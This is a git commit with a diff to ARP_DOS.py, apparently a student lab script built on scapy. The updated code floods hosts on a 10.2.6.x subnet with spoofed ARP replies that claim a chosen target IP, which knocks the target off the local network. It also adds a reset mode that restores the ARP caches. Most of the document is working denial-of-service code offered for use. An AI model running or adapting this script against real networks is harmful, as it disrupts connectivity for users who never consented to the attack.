8eb4165e4362d3a137604aa568e4b048c75de860
Jacob <regerj@oregonstate.edu>
2022-06-14 16:58:07 -0700

    Uploaded the updated attack script.

--- ARP_DOS.py
+++ ARP_DOS.py
@@ -3,36 +3,38 @@ import argparse
 import time
 import os
 import sys
+import signal
 
-def enable_linux_iproute():
-    file_path = "/proc/sys/net/ipv4/ip_forward"
-    with open(file_path) as f:
-        if f.read() == 1:
-            return
-        with open(file_path, "w") as f:
-            print(1, file=f)
-
-def get_mac(ip): 
-    ans, _ srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
-    if ans:
-        return ans[0][1].src
+def interruptHandler(signum, frame):
+    res = input("Ctrl-c was pressed. Would you like to exit? y/n ")
+    if res == 'y':
+        exit(1)
 
 def dos(target_ip):
-    target_mac = get_mac(target_ip)
-    for i in range(3, 24):
-        dst_ip = '10.2.6.' + str(i)
-        dst_mac = get_mac(dst_ip)
-        print("Sending redirect to " + dst_ip + " with a determined MAC of " + str(dst_mac))
-        for j in range(3, 24)
-            if j is not i:
-                spoofed_ip = '10.2.6.' + str(j)
-                arp_response = ARP(pdst = dst_ip, hwdst = dst_mac, psrc = spoofed_ip, hwsrc = target_mac, op = 'is-at')
-                send(arp_response, verbose=0, count=7)
+    while True:
+        for i in range(2, 10):
+            if i != 3:
+                dst_ip = '10.2.6.' + str(i)
+                arp_response = ARP(pdst = dst_ip, psrc = target_ip, op = 2)
+                send(arp_response, verbose = 0, count = 3)
+
+def reset(target_ip, target_mac):
+    for i in range(2, 10):
+        if i != 3:
+            dst_ip = '10.2.6.' + str(i)
+            arp_response = ARP(pdst = dst_ip, psrc = target_ip, hwsrc = target_mac, op = 2)
+            send(arp_response, verbose = 0, count = 7)
 
 if __name__ == "__main__":
-    #enable_linux_iproute()
-    target = '10.2.6.2'
-    try:
-        dos(target)
-    except KeyboardInterrupt:
-        print("Keyboard interrupt detected")
+    signal.signal(signal.SIGINT, interruptHandler)
+    target_ip = input("Enter your target IP address: ")
+
+    choice = input("Would you like to DoS or reset? dos/rst ")
+
+    if choice == 'dos':
+        print("Beginning DoS attack on IP: " + target_ip)
+        dos(target_ip)
+    elif choice == 'rst':
+        target_mac = getmacbyip(target_ip)
+        reset(target_ip, target_mac)
+        print ("Reset the ARP caches to their original values!")
